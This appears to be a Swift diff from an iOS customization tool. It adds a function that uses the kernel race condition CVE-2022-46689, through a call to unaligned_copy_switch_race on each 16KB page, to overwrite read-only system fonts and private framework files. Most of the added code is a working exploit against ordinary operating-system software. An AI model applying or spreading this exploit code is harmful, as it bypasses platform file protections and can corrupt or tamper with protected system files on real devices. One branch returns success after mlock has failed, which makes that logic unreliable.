@@ -53,7 +53,7 @@ func overwriteFile<Value>(typeOfFile: OverwritingFileTypes, fileIdentifier: Stri
             var succeeded = true
             for path in replacementPaths[fileIdentifier]! {
                 do {
-                    let originalData = try Data(contentsOf: URL(fileURLWithPath: path))
+                    let originalData = try Data(contentsOf: URL(fileURLWithPath: "/System/Library/PrivateFrameworks/" + path))
                     let randomGarbage = Data(String.init(repeating: "#", count: originalData.count).utf8)
                     DispatchQueue.global(qos: .userInteractive).async {
                         //overwriteFile(randomGarbage, "/System/Library/PrivateFrameworks/"+path)
@@ -61,6 +61,7 @@ func overwriteFile<Value>(typeOfFile: OverwritingFileTypes, fileIdentifier: Stri
                     }
                 } catch {
                     print("Could not get data")
+                    succeeded = false
                 }
             }
             DispatchQueue.main.async {
@@ -127,17 +128,72 @@ func overwriteFile<Value>(typeOfFile: OverwritingFileTypes, fileIdentifier: Stri
     }
 }
 
+// Overwrite the system font with the given font using CVE-2022-46689.
+// The font must be specially prepared so that it skips past the last byte in every 16KB page.
+// See BrotliPadding.swift for an implementation that adds this padding to WOFF2 fonts.
+// credit: FontOverwrite
 func overwriteFileWithDataImpl(originPath: String, backupName: String, replacementData: Data) -> Bool {
-    do {
-        let originalFile = try Data(contentsOf: URL(fileURLWithPath: originPath))
-        if replacementData.count > originalFile.count {
-            print("File size too big!")
-            return false
-        }
-        overwriteFile(replacementData, originPath)
-        return true
-    } catch {
-        print("An error occurred")
+#if false
+    let documentDirectory = FileManager.default.urls(
+        for: .documentDirectory,
+        in: .userDomainMask
+    )[0].path
+    
+    let pathToRealTarget = originPath
+    let originPath = documentDirectory + backupName
+    let origData = try! Data(contentsOf: URL(fileURLWithPath: pathToRealTarget))
+    try! origData.write(to: URL(fileURLWithPath: originPath))
+#endif
+    
+    // open and map original font
+    let fd = open(originPath, O_RDONLY | O_CLOEXEC)
+    if fd == -1 {
+        print("Could not open target file")
         return false
     }
+    defer { close(fd) }
+    // check size of font
+    let originalFileSize = lseek(fd, 0, SEEK_END)
+    guard originalFileSize >= replacementData.count else {
+        print("File too big")
+        return false
+    }
+    lseek(fd, 0, SEEK_SET)
+    
+    // Map the font we want to overwrite so we can mlock it
+    let fileMap = mmap(nil, replacementData.count, PROT_READ, MAP_SHARED, fd, 0)
+    if fileMap == MAP_FAILED {
+        print("Failed to map")
+        return false
+    }
+    // mlock so the file gets cached in memory
+    guard mlock(fileMap, replacementData.count) == 0 else {
+        print("Failed to mlock")
+        return true
+    }
+    
+    // for every 16k chunk, rewrite
+    print(Date())
+    for chunkOff in stride(from: 0, to: replacementData.count, by: 0x4000) {
+        print(String(format: "%lx", chunkOff))
+        let dataChunk = replacementData[chunkOff..<min(replacementData.count, chunkOff + 0x4000)]
+        var overwroteOne = false
+        for _ in 0..<2 {
+            let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
+                return unaligned_copy_switch_race(
+                    fd, Int64(chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count)
+            }
+            if overwriteSucceeded {
+                overwroteOne = true
+                break
+            }
+            print("try again?!")
+        }
+        guard overwroteOne else {
+            print("Failed to overwrite")
+            return false
+        }
+    }
+    print(Date())
+    return true
 }
